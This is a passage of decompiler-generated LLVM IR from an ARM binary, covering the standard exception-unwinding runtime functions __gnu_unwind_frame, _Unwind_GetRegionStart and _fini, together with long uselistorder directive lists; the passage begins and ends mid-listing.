  uselistorder i32* @lr, { 5, 0, 211, 212, 213, 214, 222, 215, 216, 217, 218, 3, 219, 220, 221, 223, 224, 225, 226, 227, 228, 230, 231, 9, 10, 232, 233, 234, 235, 236, 237, 238, 239, 240, 13, 14, 15, 16, 17, 18, 19, 20, 21, 11, 12, 22, 241, 242, 244, 245, 246, 251, 59, 60, 23, 24, 6, 249, 250, 140, 141, 142, 143, 144, 243, 247, 248, 145, 146, 147, 148, 149, 130, 131, 132, 150, 163, 164, 151, 152, 153, 154, 155, 156, 157, 4, 158, 159, 161, 162, 160, 120, 121, 165, 166, 98, 99, 167, 168, 7, 169, 170, 49, 50, 51, 52, 53, 54, 171, 172, 229, 173, 133, 174, 25, 26, 8, 27, 28, 29, 1, 33, 34, 35, 36, 37, 38, 30, 31, 32, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 56, 57, 58, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 100, 101, 102, 107, 103, 104, 105, 106, 108, 109, 110, 2, 111, 112, 113, 114, 115, 116, 117, 118, 119, 122, 123, 124, 125, 126, 127, 128, 129, 134, 135, 136, 137, 175, 176, 138, 139, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210 }
  uselistorder i32* @r6, { 500, 501, 502, 513, 503, 26, 504, 2, 505, 506, 3, 507, 508, 509, 510, 511, 512, 514, 0, 515, 516, 61, 62, 59, 60, 63, 517, 518, 4, 519, 520, 521, 522, 46, 47, 64, 5, 65, 66, 67, 68, 69, 21, 70, 71, 72, 6, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 44, 45, 48, 49, 50, 51, 7, 52, 53, 54, 8, 55, 56, 57, 58, 85, 27, 86, 22, 9, 10, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 363, 364, 365, 366, 525, 367, 11, 368, 369, 41, 12, 42, 13, 43, 523, 524, 370, 374, 375, 376, 377, 371, 372, 373, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 378, 403, 404, 405, 379, 380, 381, 382, 383, 14, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 399, 401, 395, 396, 397, 398, 400, 402, 98, 99, 1, 100, 28, 308, 309, 406, 407, 408, 409, 410, 280, 281, 411, 412, 413, 414, 415, 29, 416, 417, 418, 419, 420, 101, 102, 103, 104, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 421, 422, 423, 424, 105, 106, 107, 108, 195, 15, 196, 197, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 35, 36, 37, 38, 33, 40, 39, 30, 31, 32, 34, 146, 147, 148, 149, 150, 151, 158, 159, 160, 161, 162, 152, 153, 154, 155, 156, 157, 310, 311, 312, 313, 163, 164, 165, 166, 167, 168, 169, 173, 170, 171, 172, 174, 16, 175, 176, 177, 178, 179, 180, 198, 199, 200, 201, 23, 202, 203, 204, 17, 205, 206, 207, 213, 208, 209, 210, 211, 212, 214, 215, 216, 217, 218, 219, 224, 220, 221, 222, 223, 225, 226, 227, 228, 229, 230, 236, 231, 232, 233, 234, 235, 237, 238, 239, 240, 241, 242, 243, 248, 244, 245, 246, 247, 249, 250, 251, 252, 253, 254, 255, 256, 261, 257, 258, 259, 260, 262, 263, 264, 265, 266, 267, 268, 269, 270, 275, 271, 272, 273, 274, 276, 277, 278, 279, 289, 282, 283, 284, 285, 286, 287, 288, 290, 291, 292, 293, 294, 295, 301, 296, 297, 298, 299, 300, 302, 303, 304, 305, 306, 307, 314, 315, 316, 322, 317, 318, 319, 320, 321, 323, 324, 325, 326, 327, 328, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 18, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 25, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 24, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 19, 20, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499 }
  uselistorder label %dec_label_pc_1a638, { 1, 0 }
  uselistorder label %dec_label_pc_1a5d4, { 1, 0 }
  uselistorder label %dec_label_pc_1a580, { 1, 0 }
  uselistorder label %dec_label_pc_1a558, { 1, 0 }
  uselistorder label %dec_label_pc_1a4c4, { 1, 0 }
  uselistorder label %dec_label_pc_1a4a8, { 1, 0 }
  uselistorder label %dec_label_pc_1a48c, { 1, 0 }
  uselistorder label %dec_label_pc_1a43c, { 1, 0 }
  uselistorder label %dec_label_pc_1a420, { 1, 0 }
  uselistorder label %dec_label_pc_1a39c, { 1, 0 }
  uselistorder label %dec_label_pc_1a380, { 1, 0 }
  uselistorder label %dec_label_pc_1a2bc, { 2, 4, 5, 3, 0, 6, 7, 1 }
  uselistorder label %dec_label_pc_1a28c, { 3, 4, 5, 0, 6, 2, 7, 1, 10, 11, 8, 9 }
  uselistorder label %dec_label_pc_1a274, { 1, 0 }
  uselistorder label %dec_label_pc_1a258, { 1, 0 }
  uselistorder label %dec_label_pc_19fbc.backedge, { 2, 6, 4, 3, 5, 1, 0 }
  uselistorder label %dec_label_pc_1a0e4, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_1a0d8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a0cc, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %dec_label_pc_1a07c, { 1, 0 }
  uselistorder label %dec_label_pc_1a06c, { 1, 0 }
  uselistorder label %dec_label_pc_19ff8, { 2, 1, 0 }
}

define i32 @__gnu_unwind_frame(i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %uws_-20 = alloca %anon_struct_13.3, align 8
  %v1_1a6c0 = add i32 %ucbp, 76
  %v2_1a6c0 = inttoptr i32 %v1_1a6c0 to i32*
  %v3_1a6c0 = load i32, i32* %v2_1a6c0, align 4
  %v1_1a6c4 = add i32 %v3_1a6c0, 4
  %v2_1a6c4 = inttoptr i32 %v1_1a6c4 to i32*
  %v3_1a6c4 = load i32, i32* %v2_1a6c4, align 4
  %v3_1a6cc = mul i32 %v3_1a6c4, 256
  %v4_1a6d4 = getelementptr inbounds %anon_struct_13.3, %anon_struct_13.3* %uws_-20, i32 0, i32 0
  store i32 %v3_1a6cc, i32* %v4_1a6d4, align 8
  %tmp7 = bitcast %anon_struct_13.3* %uws_-20 to %anon_struct_13*
  %v4_1a6f4 = call i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %tmp7)
  ret i32 %v4_1a6f4

; uselistorder directives
  uselistorder %anon_struct_13.3* %uws_-20, { 1, 0 }
  uselistorder i32 (i32, %anon_struct_13*)* @__gnu_unwind_execute, { 1, 0 }
  uselistorder i32 256, { 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 279, 270, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 262, 271, 268, 47, 269, 48, 50, 49, 51, 261, 0, 266, 1, 52, 53, 54, 55, 56, 57, 59, 60, 61, 58, 63, 64, 65, 62, 66, 67, 272, 273, 68, 69, 70, 274, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 81, 80, 83, 264, 275, 265, 84, 85, 86, 87, 88, 90, 89, 91, 93, 92, 94, 276, 95, 96, 277, 107, 101, 97, 108, 102, 109, 103, 98, 99, 104, 105, 110, 106, 100, 111, 112, 113, 114, 115, 116, 117, 124, 121, 118, 125, 122, 126, 123, 119, 120, 127, 128, 129, 130, 141, 136, 142, 137, 143, 138, 144, 139, 131, 132, 133, 134, 145, 140, 135, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 162, 159, 163, 160, 164, 161, 156, 157, 158, 165, 166, 167, 168, 169, 179, 180, 174, 170, 181, 175, 182, 176, 171, 177, 183, 178, 172, 173, 184, 185, 186, 187, 188, 189, 194, 192, 190, 195, 193, 191, 196, 263, 278, 197, 199, 198, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 217, 224, 218, 225, 219, 220, 213, 214, 226, 221, 227, 222, 215, 216, 223, 228, 229, 230, 231, 232, 233, 238, 245, 239, 246, 240, 234, 235, 247, 241, 248, 242, 243, 236, 237, 244, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 267, 260 }
  uselistorder i32 4, { 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 118, 523, 524, 525, 526, 527, 3, 530, 531, 528, 529, 532, 4, 533, 534, 535, 536, 5, 553, 6, 537, 538, 539, 540, 541, 7, 542, 8, 543, 544, 545, 546, 547, 548, 549, 9, 550, 155, 551, 552, 554, 555, 556, 557, 10, 558, 11, 263, 264, 265, 266, 282, 283, 559, 244, 245, 440, 250, 267, 12, 13, 562, 14, 15, 105, 100, 101, 16, 563, 102, 564, 76, 17, 18, 103, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 19, 582, 583, 584, 585, 586, 587, 75, 588, 589, 590, 591, 592, 593, 20, 21, 104, 594, 275, 119, 273, 274, 268, 269, 270, 271, 272, 246, 247, 248, 249, 251, 252, 253, 254, 255, 256, 22, 257, 120, 258, 259, 260, 261, 262, 156, 276, 277, 278, 279, 280, 281, 23, 284, 285, 286, 287, 323, 324, 288, 289, 290, 595, 24, 157, 121, 158, 597, 25, 598, 159, 242, 243, 596, 92, 406, 407, 408, 409, 160, 77, 444, 445, 446, 447, 448, 449, 161, 162, 26, 450, 451, 452, 453, 454, 455, 456, 457, 163, 442, 443, 410, 411, 412, 413, 414, 415, 416, 417, 418, 27, 419, 420, 421, 458, 28, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 164, 165, 166, 473, 474, 477, 480, 475, 476, 122, 167, 478, 69, 479, 481, 482, 483, 485, 168, 30, 29, 484, 169, 170, 171, 291, 31, 32, 172, 70, 33, 34, 325, 326, 327, 328, 329, 35, 330, 78, 486, 487, 212, 36, 37, 560, 561, 213, 38, 39, 292, 123, 293, 79, 233, 124, 234, 40, 126, 235, 127, 236, 128, 237, 295, 296, 41, 297, 87, 88, 86, 298, 214, 215, 238, 239, 125, 220, 221, 222, 216, 217, 218, 219, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 240, 241, 72, 71, 299, 93, 300, 42, 301, 74, 73, 302, 43, 294, 303, 304, 309, 129, 310, 130, 312, 131, 313, 314, 311, 305, 132, 306, 307, 308, 315, 91, 90, 89, 316, 133, 44, 45, 46, 47, 48, 49, 317, 81, 80, 318, 82, 134, 319, 320, 321, 135, 322, 331, 173, 332, 333, 334, 335, 336, 174, 175, 136, 337, 50, 137, 338, 106, 339, 340, 176, 341, 342, 177, 178, 343, 138, 344, 107, 345, 346, 179, 180, 347, 181, 348, 349, 350, 182, 183, 351, 139, 352, 108, 353, 184, 185, 354, 355, 356, 140, 109, 357, 358, 186, 359, 360, 361, 187, 188, 0, 141, 362, 110, 363, 364, 365, 189, 366, 367, 190, 191, 1, 94, 368, 142, 369, 111, 370, 371, 372, 373, 192, 193, 374, 375, 376, 194, 377, 378, 143, 379, 2, 380, 112, 381, 144, 382, 383, 384, 195, 385, 386, 387, 388, 196, 197, 146, 389, 95, 390, 145, 391, 113, 392, 393, 394, 198, 395, 396, 397, 147, 398, 148, 399, 400, 401, 199, 200, 149, 402, 96, 403, 114, 404, 115, 405, 201, 51, 422, 202, 52, 423, 203, 53, 424, 204, 54, 425, 205, 97, 55, 426, 427, 206, 56, 428, 207, 57, 429, 208, 58, 430, 209, 59, 431, 210, 60, 432, 433, 211, 434, 435, 436, 437, 438, 439, 488, 441, 489, 490, 491, 116, 492, 98, 493, 494, 495, 496, 117, 497, 150, 498, 499, 500, 99, 501, 151, 502, 61, 62, 63, 64, 65, 503, 504, 505, 66, 85, 84, 83, 506, 67, 68, 152, 507, 153, 508, 509, 510, 154, 511, 512 }
  uselistorder i32 76, { 18, 19, 20, 21, 22, 23, 0, 3, 5, 4, 6, 2, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 1 }
  uselistorder i32 1, { 711, 1292, 1293, 545, 1297, 1298, 1299, 1300, 584, 1301, 1302, 506, 524, 585, 1294, 1295, 1296, 1303, 546, 1304, 712, 134, 139, 137, 135, 140, 136, 138, 713, 714, 715, 716, 586, 587, 1305, 1306, 494, 719, 718, 717, 321, 323, 322, 324, 326, 325, 722, 721, 720, 279, 588, 589, 332, 1307, 158, 1308, 725, 724, 723, 162, 1309, 1310, 1311, 1312, 727, 726, 153, 155, 156, 154, 157, 108, 109, 499, 728, 377, 987, 729, 378, 379, 380, 730, 90, 988, 989, 990, 33, 32, 34, 35, 731, 284, 732, 64, 61, 62, 60, 63, 733, 553, 960, 102, 103, 101, 331, 330, 1313, 525, 590, 1314, 1, 0, 734, 150, 146, 144, 145, 151, 148, 149, 152, 147, 143, 591, 239, 735, 382, 383, 381, 507, 544, 508, 1170, 1171, 1172, 1173, 526, 736, 384, 738, 737, 385, 386, 966, 739, 991, 992, 993, 1316, 995, 994, 495, 740, 512, 996, 513, 1317, 962, 961, 1318, 514, 1319, 1320, 1321, 1322, 1323, 1324, 922, 1325, 1326, 1327, 1328, 1329, 1330, 923, 704, 742, 741, 464, 468, 470, 466, 465, 467, 469, 471, 473, 472, 1000, 997, 998, 999, 541, 515, 280, 281, 283, 282, 592, 1001, 1002, 1017, 1018, 743, 705, 327, 328, 1009, 924, 1010, 1011, 925, 1012, 1013, 1014, 1015, 1016, 307, 301, 302, 304, 308, 305, 303, 306, 300, 309, 1003, 1004, 1005, 593, 1006, 1007, 1008, 744, 476, 480, 477, 474, 481, 475, 479, 478, 482, 1019, 1020, 1021, 745, 182, 181, 178, 177, 176, 183, 179, 180, 184, 1022, 1023, 1024, 1025, 746, 171, 172, 170, 174, 173, 175, 747, 329, 964, 594, 963, 542, 750, 749, 748, 388, 391, 387, 389, 396, 390, 395, 394, 392, 393, 595, 965, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 516, 751, 398, 397, 399, 402, 400, 401, 403, 978, 979, 980, 981, 982, 983, 984, 985, 986, 752, 81, 85, 87, 84, 82, 86, 83, 88, 596, 977, 753, 353, 1026, 1027, 1028, 1029, 1030, 597, 754, 53, 54, 56, 55, 57, 598, 58, 755, 42, 41, 38, 39, 40, 36, 37, 756, 43, 44, 51, 52, 47, 48, 49, 50, 45, 46, 757, 129, 127, 128, 758, 404, 759, 121, 120, 760, 118, 117, 761, 107, 106, 762, 1067, 74, 77, 75, 76, 405, 78, 79, 763, 299, 298, 764, 132, 765, 766, 125, 126, 1331, 1332, 1333, 599, 1334, 1335, 600, 1336, 769, 768, 767, 17, 19, 25, 18, 23, 22, 26, 24, 20, 21, 770, 89, 601, 771, 406, 407, 408, 27, 772, 415, 413, 414, 412, 409, 410, 411, 773, 114, 115, 113, 116, 112, 774, 775, 159, 777, 776, 141, 778, 124, 1175, 781, 780, 779, 104, 105, 782, 91, 93, 92, 94, 517, 783, 80, 490, 496, 1150, 784, 14, 11, 12, 13, 15, 16, 1151, 1152, 1153, 786, 785, 417, 416, 422, 421, 418, 423, 420, 425, 419, 424, 426, 286, 500, 957, 958, 959, 787, 788, 1337, 527, 602, 790, 789, 791, 1176, 1179, 1180, 1181, 792, 427, 432, 433, 431, 430, 434, 428, 429, 1182, 1183, 1184, 1185, 793, 439, 445, 438, 444, 443, 437, 447, 446, 441, 435, 440, 436, 442, 1177, 1178, 603, 270, 272, 271, 366, 1154, 604, 1155, 1156, 1157, 1158, 1159, 794, 68, 69, 67, 70, 1186, 123, 122, 1187, 1188, 1189, 1190, 1191, 1192, 554, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 606, 1201, 1202, 1203, 1204, 1205, 605, 1206, 1207, 1208, 1209, 1210, 795, 450, 452, 448, 451, 456, 459, 455, 457, 458, 453, 454, 449, 269, 268, 607, 608, 504, 799, 798, 797, 796, 142, 71, 518, 133, 800, 73, 72, 10, 801, 111, 110, 802, 119, 803, 460, 804, 805, 461, 806, 186, 807, 462, 808, 809, 463, 810, 248, 247, 811, 297, 296, 812, 293, 292, 813, 814, 485, 815, 376, 375, 816, 817, 486, 818, 1140, 1141, 294, 295, 927, 928, 929, 930, 931, 932, 933, 1338, 28, 29, 30, 31, 819, 1068, 609, 310, 311, 1031, 820, 201, 200, 610, 1069, 821, 354, 355, 611, 822, 335, 333, 334, 1070, 823, 165, 164, 163, 824, 825, 267, 266, 826, 166, 827, 483, 828, 161, 160, 829, 169, 168, 830, 273, 832, 831, 225, 226, 834, 833, 130, 131, 224, 1211, 491, 1212, 492, 1315, 215, 214, 1213, 1214, 1215, 1216, 498, 1217, 836, 835, 312, 320, 315, 318, 316, 317, 313, 314, 319, 493, 509, 1218, 1219, 1220, 1221, 66, 65, 2, 1222, 1223, 1224, 1225, 1226, 519, 1227, 520, 1228, 838, 837, 484, 1071, 1072, 1073, 1074, 839, 1229, 1230, 1231, 510, 528, 3, 497, 4, 1232, 1233, 1234, 1235, 612, 1236, 291, 1160, 285, 1238, 1237, 1239, 1240, 185, 1241, 840, 290, 289, 288, 287, 1242, 841, 190, 189, 188, 187, 613, 952, 614, 953, 557, 954, 529, 625, 955, 1032, 556, 1033, 939, 530, 626, 627, 940, 935, 616, 934, 936, 937, 938, 619, 617, 505, 941, 618, 942, 943, 620, 944, 945, 623, 946, 947, 621, 948, 949, 622, 950, 951, 624, 956, 1034, 1035, 1036, 628, 1037, 1038, 1039, 629, 1040, 926, 1043, 1042, 615, 1041, 1044, 1045, 630, 1046, 1047, 1048, 1055, 1056, 501, 631, 706, 852, 851, 850, 849, 848, 847, 846, 707, 845, 844, 843, 842, 209, 205, 204, 208, 210, 206, 207, 1049, 1050, 632, 1051, 1052, 633, 1053, 1054, 195, 194, 193, 199, 196, 197, 198, 192, 191, 634, 635, 854, 853, 488, 489, 1142, 856, 855, 372, 373, 371, 370, 369, 368, 374, 638, 558, 1057, 1058, 559, 1059, 1060, 636, 637, 639, 1061, 1062, 640, 641, 642, 643, 644, 645, 646, 869, 868, 867, 866, 865, 864, 863, 862, 861, 860, 710, 859, 858, 857, 236, 238, 237, 647, 502, 648, 870, 651, 650, 649, 1063, 872, 871, 652, 653, 654, 1064, 1065, 655, 543, 656, 1066, 503, 657, 876, 875, 874, 873, 203, 202, 1075, 1081, 6, 531, 1076, 658, 1077, 5, 1078, 547, 1079, 532, 533, 1080, 1082, 1083, 548, 1084, 708, 880, 879, 709, 878, 877, 367, 1143, 560, 561, 1144, 7, 8, 9, 1085, 1086, 1087, 511, 549, 550, 1088, 1089, 1090, 1091, 1092, 660, 1093, 659, 1094, 661, 1095, 1096, 1097, 884, 883, 882, 881, 259, 260, 264, 261, 263, 258, 262, 265, 1098, 1099, 1100, 662, 663, 886, 885, 275, 277, 278, 274, 276, 1101, 1102, 664, 1103, 1104, 1105, 1106, 665, 1107, 666, 563, 562, 667, 1108, 887, 243, 244, 246, 245, 241, 242, 1109, 668, 1110, 566, 564, 565, 889, 888, 343, 344, 1111, 1112, 1113, 669, 1114, 670, 671, 1115, 567, 1116, 890, 217, 220, 221, 223, 222, 216, 219, 218, 1117, 1118, 1119, 672, 1120, 673, 569, 568, 674, 1121, 675, 1122, 891, 251, 254, 255, 257, 256, 249, 253, 252, 250, 1123, 1124, 1125, 1126, 1127, 1128, 676, 1129, 677, 1130, 678, 574, 573, 679, 1131, 570, 1132, 571, 1133, 572, 1134, 897, 896, 895, 894, 893, 892, 336, 339, 340, 342, 341, 337, 338, 1135, 1136, 1137, 680, 577, 576, 681, 1138, 575, 1139, 898, 346, 350, 351, 352, 345, 349, 348, 347, 1145, 1146, 1147, 682, 580, 579, 683, 1148, 578, 1149, 903, 902, 901, 900, 899, 228, 232, 233, 235, 234, 227, 231, 230, 229, 1161, 581, 684, 904, 212, 211, 213, 1162, 1163, 534, 685, 1166, 686, 687, 1167, 1164, 1165, 1168, 1169, 100, 97, 96, 98, 95, 99, 1243, 905, 240, 1174, 906, 59, 1244, 167, 1245, 693, 1246, 1247, 691, 1248, 692, 1249, 1250, 696, 1251, 1252, 552, 694, 1253, 695, 1254, 1255, 583, 1256, 1257, 537, 1258, 1259, 1260, 1261, 1262, 1263, 1264, 522, 1265, 697, 1266, 698, 699, 1267, 1268, 1269, 1270, 538, 1271, 1272, 539, 1273, 1274, 540, 1275, 523, 536, 535, 1276, 1277, 690, 1278, 1279, 688, 1280, 521, 689, 582, 1281, 1283, 1284, 1282, 700, 1285, 701, 1286, 702, 1287, 1288, 921, 555, 1289, 1290, 551, 703, 1291, 918, 917, 916, 915, 914, 913, 912, 911, 910, 909, 908, 907, 358, 357, 361, 363, 359, 365, 364, 356, 360, 362, 919, 920, 487 }
}

define i32 @_Unwind_GetRegionStart(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_1a720 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_1a728 = add i32 %tmp1, 72
  %v2_1a728 = inttoptr i32 %v1_1a728 to i32*
  %v3_1a728 = load i32, i32* %v2_1a728, align 4
  ret i32 %v3_1a728

; uselistorder directives
  uselistorder i32 72, { 10, 11, 0, 12, 2, 3, 1, 4, 7, 8, 5, 6, 9 }
  uselistorder i32 (i32, i32, i32, i32, i8*)* @_Unwind_VRS_Get, { 10, 8, 7, 6, 5, 9, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i32* @0 to i8*), { 0, 3, 4, 7, 5, 6, 1, 2, 8, 14, 13, 10, 11, 9, 12, 15, 16, 17 }
  uselistorder i32 12, { 8, 7, 10, 9, 175, 176, 177, 178, 15, 16, 62, 17, 179, 54, 11, 180, 181, 182, 183, 184, 186, 187, 185, 188, 189, 190, 191, 192, 193, 194, 18, 19, 20, 21, 23, 22, 24, 55, 56, 25, 26, 57, 58, 59, 60, 61, 63, 64, 88, 65, 66, 195, 5, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 3, 121, 122, 123, 124, 125, 27, 126, 144, 28, 29, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 163, 156, 157, 158, 159, 160, 161, 162, 164, 165, 30, 166, 4, 89, 90, 31, 91, 92, 93, 12, 67, 50, 51, 40, 68, 69, 42, 52, 43, 44, 39, 41, 45, 46, 47, 48, 49, 53, 70, 71, 72, 6, 73, 74, 75, 76, 78, 79, 80, 32, 81, 33, 82, 34, 83, 35, 84, 36, 86, 87, 85, 77, 116, 94, 37, 95, 96, 97, 98, 99, 100, 101, 102, 38, 103, 104, 105, 13, 106, 107, 108, 109, 110, 111, 14, 112, 113, 114, 115, 117, 118, 119, 120, 0, 1, 2, 167, 168, 169, 170, 171, 173, 172, 174 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v3_1a73c = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_1a73c)
  %v31_1a744 = load i32, i32* @r0, align 4
  ret i32 %v31_1a744

; uselistorder directives
  uselistorder i32* @r0, { 13, 14, 15, 298, 299, 300, 16, 42, 79, 90, 301, 304, 305, 70, 17, 302, 303, 222, 45, 8, 306, 9, 18, 80, 0, 81, 10, 11, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 1, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 82, 41, 71, 72, 73, 74, 75, 76, 77, 78, 83, 84, 85, 86, 87, 88, 89, 19, 224, 20, 225, 21, 22, 23, 24, 177, 178, 333, 334, 336, 55, 56, 57, 58, 25, 195, 196, 2, 26, 27, 92, 93, 3, 28, 29, 337, 338, 4, 30, 31, 226, 227, 5, 32, 33, 68, 69, 335, 91, 228, 34, 52, 53, 229, 6, 230, 231, 232, 215, 51, 216, 217, 218, 54, 219, 220, 35, 240, 233, 234, 235, 236, 237, 238, 239, 94, 95, 209, 36, 210, 241, 37, 242, 203, 38, 204, 243, 39, 244, 245, 40, 246, 96, 47, 97, 98, 48, 43, 179, 180, 181, 182, 247, 44, 248, 46, 249, 250, 251, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 61, 161, 59, 60, 62, 162, 164, 165, 166, 167, 168, 169, 163, 50, 12, 170, 171, 172, 173, 174, 175, 176, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 211, 212, 7, 197, 198, 199, 200, 201, 202, 205, 206, 207, 208, 213, 214, 221, 223, 63, 64, 65, 252, 66, 253, 67, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 49 }
  uselistorder void (i32)* @__pseudo_branch, { 1, 68, 61, 62, 63, 64, 65, 66, 67, 69, 70, 71, 72, 17, 18, 19, 20, 21, 22, 13, 14, 15, 16, 23, 24, 25, 26, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 27, 28, 29, 73, 78, 79, 80, 81, 82, 83, 84, 74, 88, 89, 90, 91, 48, 49, 36, 37, 38, 39, 40, 41, 42, 43, 50, 75, 76, 77, 85, 86, 87, 51, 52, 53, 0, 44, 45, 46, 54, 58, 59, 55, 56, 57, 92, 30, 31, 32, 33, 34, 35, 47, 60 }
  uselistorder i32 0, { 385, 384, 425, 426, 1374, 389, 388, 427, 1375, 1376, 1377, 1378, 332, 331, 428, 1379, 1380, 182, 1381, 1383, 1384, 130, 131, 1385, 1386, 1382, 73, 74, 75, 76, 2, 1, 3, 0, 171, 170, 172, 173, 174, 1387, 386, 387, 121, 117, 1388, 1389, 176, 177, 175, 178, 1390, 1391, 1392, 1393, 181, 180, 179, 1394, 1395, 1396, 375, 374, 429, 390, 430, 391, 431, 392, 432, 433, 434, 132, 1397, 406, 405, 1398, 1399, 404, 403, 1400, 435, 401, 402, 399, 400, 398, 397, 1401, 396, 395, 394, 393, 346, 1402, 1418, 1403, 185, 1404, 1405, 1406, 1407, 1408, 1409, 187, 1411, 1412, 183, 184, 1413, 1414, 110, 133, 1415, 1416, 636, 77, 78, 376, 377, 186, 1410, 1417, 345, 1419, 436, 437, 1420, 408, 407, 188, 1421, 1422, 189, 1423, 1424, 1425, 89, 438, 439, 1426, 190, 1427, 134, 1428, 1429, 191, 1430, 1431, 1432, 1433, 1434, 1435, 1436, 1437, 1438, 1439, 35, 111, 440, 1440, 192, 1441, 1442, 1443, 4, 1444, 1445, 5, 1446, 1447, 875, 876, 6, 122, 1448, 441, 1449, 789, 790, 791, 792, 793, 797, 794, 795, 796, 7, 347, 79, 798, 442, 799, 800, 801, 409, 410, 877, 878, 8, 443, 734, 444, 1450, 1451, 1452, 9, 10, 135, 136, 137, 1467, 1468, 11, 735, 138, 139, 1162, 1163, 1164, 1165, 193, 194, 1166, 744, 195, 112, 45, 1469, 80, 348, 1473, 1474, 46, 802, 90, 803, 804, 805, 349, 140, 1470, 1471, 1472, 350, 12, 1475, 1476, 1477, 1478, 1479, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 1480, 1481, 1492, 1493, 1494, 1495, 1496, 1497, 1498, 1499, 36, 1500, 1501, 1502, 1503, 1504, 37, 1505, 1506, 1507, 38, 1508, 1509, 1510, 39, 1511, 1512, 1513, 1514, 1515, 1516, 1517, 1518, 1519, 1520, 1521, 1522, 1523, 1524, 1525, 1526, 1527, 1528, 1529, 1530, 1531, 1532, 1533, 1534, 1537, 1538, 1539, 1540, 1541, 1542, 1543, 1535, 1536, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553, 40, 1554, 1555, 1556, 1557, 1558, 41, 1559, 1560, 1561, 1562, 1563, 42, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 1578, 196, 806, 637, 807, 808, 809, 810, 844, 445, 446, 845, 846, 141, 142, 143, 200, 811, 198, 812, 833, 826, 638, 827, 828, 829, 830, 47, 48, 93, 831, 832, 351, 834, 835, 639, 836, 197, 837, 49, 50, 92, 838, 839, 640, 840, 841, 51, 52, 91, 842, 199, 843, 144, 813, 641, 814, 815, 447, 816, 817, 642, 818, 819, 822, 820, 821, 352, 823, 53, 54, 95, 824, 643, 55, 56, 94, 825, 847, 644, 848, 849, 850, 851, 852, 853, 645, 854, 855, 856, 857, 737, 736, 355, 739, 740, 738, 353, 354, 741, 742, 448, 743, 745, 746, 646, 747, 748, 749, 647, 750, 751, 57, 58, 96, 752, 753, 754, 81, 82, 755, 756, 